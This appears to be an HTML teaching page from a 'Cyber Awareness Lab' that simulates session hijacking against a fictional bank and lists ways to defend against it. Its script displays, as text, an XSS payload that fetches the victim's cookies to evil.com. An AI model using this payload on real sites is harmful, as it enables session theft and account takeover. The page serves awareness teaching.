@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Session Hijacking | Cyber Awareness Lab</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Orbitron',Consolas,monospace,sans-serif;}
+@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&display=swap');
+body{background:#050505;color:#fff;overflow-x:hidden;}
+canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;}
+header{padding:25px;text-align:center;background:rgba(0,0,0,.4);backdrop-filter:blur(10px);border-bottom:1px solid #ffdd00;}
+header h1{color:#ffdd00;font-size:34px;text-shadow:0 0 20px #ffdd00;}
+header p{color:#ffee88;margin-top:8px;}
+.container{max-width:950px;margin:30px auto;padding:20px;}
+
+.lab-content{background:rgba(255,255,255,.05);border:1px solid #ffdd00;border-radius:15px;padding:25px;margin-bottom:25px;backdrop-filter:blur(8px);}
+.lab-content h2{color:#ffdd00;margin-bottom:15px;}
+.lab-content .desc{color:#ddd;margin-bottom:20px;line-height:1.7;}
+
+.browser-demo{background:#0a0a0a;border:1px solid #333;border-radius:10px;padding:20px;margin:15px 0;}
+.browser-tab-bar{display:flex;gap:3px;margin-bottom:15px;}
+.browser-tab{background:#111;border:1px solid #333;padding:8px 12px;border-radius:6px 6px 0 0;font-size:11px;color:#888;}
+.browser-tab.active{background:#0a0a0a;color:#fff;border-bottom:1px solid #0a0a0a;}
+.browser-url{display:flex;gap:8px;background:#111;border:1px solid #333;border-radius:6px;padding:8px 12px;margin-bottom:15px;align-items:center;}
+.browser-url .lock{color:#00ff66;font-size:14px;}
+.browser-url .url-text{color:#aaa;font-size:13px;flex:1;}
+
+.session-table{width:100%;border-collapse:collapse;margin:15px 0;font-size:12px;}
+.session-table th{background:#111;color:#ffdd00;padding:8px;border:1px solid #333;text-align:left;}
+.session-table td{padding:8px;border:1px solid #333;color:#ccc;}
+.session-table tr.stolen td{background:rgba(255,0,0,.05);color:#ff6666;}
+
+.cookie-display{background:#0a0a0a;border:1px solid #333;border-radius:8px;padding:15px;margin:10px 0;font-family:Consolas,monospace;font-size:12px;word-break:break-all;}
+.cookie-display .cookie-label{color:#ffdd00;}
+.cookie-display .cookie-value{color:#ff4444;}
+
+.btn{background:#ffdd00;color:#000;border:none;padding:12px 24px;font-weight:bold;border-radius:6px;cursor:pointer;margin:5px;transition:.2s;font-family:'Orbitron',sans-serif;}
+.btn:hover{transform:scale(1.03);box-shadow:0 0 20px #ffdd00;}
+.btn.danger{background:#ff4444;color:#fff;}
+.btn.danger:hover{box-shadow:0 0 20px #ff4444;}
+
+.tip-box{background:#2a2000;border-left:4px solid #ffdd00;padding:15px;margin:15px 0;line-height:1.8;}
+footer{padding:25px;text-align:center;border-top:1px solid #ffdd00;color:#ffee88;}
+</style>
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<header>
+<h1>🍪 Session Hijacking Lab</h1>
+<p>Understand how attackers steal session tokens to impersonate authenticated users</p>
+</header>
+<div class="container">
+<div class="lab-content">
+<h2>🍪 Session Hijacking Demonstration</h2>
+<p class="desc">Session hijacking involves stealing a user's session cookie or token to impersonate them on a web application without needing their password.</p>
+
+<div class="browser-demo">
+<div class="browser-tab-bar">
+<div class="browser-tab active">🏦 Online Banking</div>
+<div class="browser-tab">📧 Email</div>
+<div class="browser-tab">⚙️ Settings</div>
+</div>
+<div class="browser-url">
+<span class="lock">🔒</span>
+<span class="url-text">https://www.mysecurebank.com/account</span>
+<span style="color:#888;font-size:11px;">(Victim's Browser)</span>
+</div>
+
+<div id="bankDashboard" style="background:#111;border-radius:8px;padding:20px;">
+<h3 style="color:#00ff66;">✅ Logged in as: John Doe</h3>
+<p style="color:#888;margin-top:8px;">Account: ****-****-****-8842 | Balance: $24,850.00</p>
+<div style="display:flex;gap:10px;margin-top:15px;">
+<div style="background:#0a0a0a;border:1px solid #333;border-radius:6px;padding:15px;flex:1;text-align:center;">
+<p style="color:#888;font-size:11px;">Checking</p>
+<p style="color:#00ff66;font-size:18px;">$12,400.00</p>
+</div>
+<div style="background:#0a0a0a;border:1px solid #333;border-radius:6px;padding:15px;flex:1;text-align:center;">
+<p style="color:#888;font-size:11px;">Savings</p>
+<p style="color:#00ff66;font-size:18px;">$12,450.00</p>
+</div>
+</div>
+</div>
+
+<div class="cookie-display" style="margin-top:15px;">
+<div class="cookie-label">🍪 Session Cookie (HTTPOnly):</div>
+<div class="cookie-value">SESSIONID=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obi5kb2VAZW1haWwuY29tIiwicm9sZSI6InVzZXIifQ==</div>
+</div>
+</div>
+
+<button class="btn" onclick="showCookieTheft()">👁️ Show XSS Cookie Theft</button>
+<button class="btn danger" onclick="hijackSession()">🍪 Hijack Session</button>
+
+<div id="hijackResult" class="result-box" style="display:none;"></div>
+</div>
+
+<div class="lab-content">
+<h2>🛡️ Session Security</h2>
+<div class="tip-box">
+<strong>🛡️ How to Protect Against Session Hijacking:</strong>
+<ul style="margin-left:20px;margin-top:8px;line-height:2.2;">
+<li>🍪 Set Secure, HTTPOnly, and SameSite flags on cookies</li>
+<li>🔐 Use short session expiration times and rotate tokens frequently</li>
+<li>🛡️ Implement CSRF tokens for state-changing requests</li>
+<li>🔒 Use HTTPS exclusively to prevent cookie interception</li>
+<li>📋 Bind sessions to IP addresses and User-Agent strings</li>
+<li>🚫 Validate session on every request (server-side)</li>
+<li>🔑 Implement re-authentication for sensitive actions</li>
+<li>🔄 Invalidate sessions on logout and password change</li>
+</ul>
+</div>
+</div>
+</div>
+<footer>Cyber Awareness Lab • Created by Priyanshu Jangra</footer>
+
+<script>
+const canvas=document.getElementById("matrix");const ctx=canvas.getContext("2d");
+canvas.width=window.innerWidth;canvas.height=window.innerHeight;
+const chars="01ABCDEFGHIJKLMNOPQRSTUVWXYZ#$%&";const sz=14;
+const cols=Math.floor(canvas.width/sz);const dr=Array(cols).fill(1);
+function draw(){ctx.fillStyle="rgba(0,0,0,0.05)";ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle="#ffdd00";ctx.font=sz+"px monospace";for(let i=0;i<dr.length;i++){const t=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(t,i*sz,dr[i]*sz);if(dr[i]*sz>canvas.height&&Math.random()>0.98)dr[i]=0;dr[i]++;}}
+setInterval(draw,35);
+window.onresize=()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;};
+
+let hijacked = false;
+
+function showCookieTheft(){
+const r = document.getElementById('hijackResult');
+r.style.display = 'block';
+r.className = 'result-box info';
+r.innerHTML = '🔍 <strong>XSS Cookie Theft Simulation:</strong><br><br>'+
+'📋 Attacker injects malicious script via comment form:<br>'+
+'<code style="background:#111;padding:4px;border-radius:3px;display:block;margin:8px 0;color:#ffdd00;"><img src=x onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)"></code>'+
+'🍪 Cookie exfiltrated to attacker\'s server: <strong style="color:#ff4444;">SESSIONID=eyJhbGciOiJIUzI1NiIs...</strong><br><br>'+
+'⚠️ The attacker now has the victim\'s session cookie and can impersonate them!';
+}
+
+function hijackSession(){
+if(hijacked) return;
+hijacked = true;
+
+const dashboard = document.getElementById('bankDashboard');
+dashboard.innerHTML = '';
+dashboard.style.border = '2px solid #ff4444';
+
+const r = document.getElementById('hijackResult');
+r.style.display = 'block';
+r.className = 'result-box fail';
+r.innerHTML = '💀 <strong>Session Hijacked!</strong><br><br>'+
+'🍪 Attacker uses stolen cookie to impersonate John Doe<br><br>'+
+'<strong style="color:#ff4444;">Actions performed by attacker:</strong><br>'+
+'💰 Wire transfer of $4,500 to account #7732-2291<br>'+
+'🔄 Changed account recovery email to attacker@evil.com<br>'+
+'📋 Downloaded 2 years of transaction history<br><br>'+
+'<strong>Session details:</strong><br>'+
+'🖥️ Attacker IP: 198.51.100.45 (vs victim IP: 203.0.113.22)<br>'+
+'🌍 Location: Moscow, Russia (vs victim: New York, USA)<br>'+
+'⏰ Time: 2 minutes after theft';
+
+dashboard.innerHTML = 
+'<h3 style="color:#ff4444;">🚨 SESSION HIJACKED</h3>'+
+'<p style="color:#ff8888;margin-top:8px;">This account has been accessed by an unauthorized user</p>'+
+'<div style="background:#2a0000;border:1px solid #ff4444;border-radius:8px;padding:12px;margin-top:10px;">'+
+'<p style="color:#ff6666;">⚠️ Unauthorized wire transfer initiated: <strong>$4,500.00</strong></p>'+
+'<p style="color:#ff6666;margin-top:5px;">⚠️ Account recovery email changed</p>'+
+'</div>';
+
+document.querySelector('.browser-url .lock').textContent = '🔓';
+document.querySelector('.browser-url .lock').style.color = '#ff4444';
+}
+</script>
+</body>
+</html>
